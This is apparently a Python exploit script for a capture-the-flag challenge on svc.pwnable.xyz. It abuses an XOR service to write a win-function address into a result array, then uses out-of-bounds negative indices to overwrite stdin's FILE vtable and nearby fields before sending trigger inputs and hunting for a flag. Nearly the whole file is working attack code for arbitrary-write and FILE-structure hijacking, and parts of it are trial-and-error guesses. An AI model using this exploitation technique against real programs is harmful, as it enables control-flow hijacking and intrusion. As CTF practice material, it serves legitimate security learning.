#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

def send_xor(a, b, c, desc=""):
    payload = f"{a} {b} {c}\n"
    if desc:
        print(f"{desc}: {a} ^ {b} -> result[{c}]")
    s.sendall(payload.encode())
    time.sleep(0.2)
    try:
        resp = s.recv(2048, socket.MSG_DONTWAIT)
        sys.stdout.write(".")
        sys.stdout.flush()
        return resp
    except:
        return b""

print("\n=== Estrategia: Construir ROP/shellcode en result[], luego redirigir ===\n")

# Paso 1: Llenar result[1-9] con valores útiles
print("Paso 1: Llenando result[]...")
# result[1] = win address
send_xor(win ^ 111, 111, 1, "result[1] = win")

# result[2-9] también con win por si acaso
for i in range(2, 10):
    send_xor(win ^ (i*111), i*111, i)

print(" OK")

# Paso 2: Sobrescribir algo crítico en stdin
print("\nPaso 2: Sobrescribiendo stdin...")

# Intentar sobrescribir vtable con puntero a result[1]
fake_vtable_addr = result_base + 8  # result[1]
send_xor(fake_vtable_addr ^ 0x4242424242424242, 0x4242424242424242, -4, "vtable = result[1]")

# También sobrescribir stdin+192 (offset -8)
send_xor(fake_vtable_addr ^ 0x1234567812345678, 0x1234567812345678, -8, "stdin+192 = result[1]")

# Y stdin+200 (offset -7)
send_xor(win ^ 0x7777777777777777, 0x7777777777777777, -7, "stdin+200 = win")

print(" OK")

# Paso 3: Triggerar
print("\nPaso 3: Triggerando...")

triggers = [
    "1 2 3\n",
    "10 20 5\n",
    "0 1 1\n",  # exit
]

for trig in triggers:
    try:
        print(f"  Enviando: {trig.strip()}")
        s.sendall(trig.encode())
        time.sleep(1)
        
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"FLAG" in chunk or b"flag" in chunk or b"{" in chunk:
                    print(f"\n\n{'='*60}")
                    print("¡POSIBLE FLAG!")
                    print(data.decode())
                    print('='*60)
                    sys.exit(0)
        except:
            pass
            
        if data:
            print(f"    -> {data.decode().strip()[:100]}")
    except BrokenPipeError:
        print(f"    -> CRASH")
        break
    except Exception as e:
        print(f"    -> {e}")
        break

print("\nLeyendo final...")
time.sleep(2)
try:
    final = s.recv(4096)
    if final:
        print(final.decode())
except:
    pass

s.close()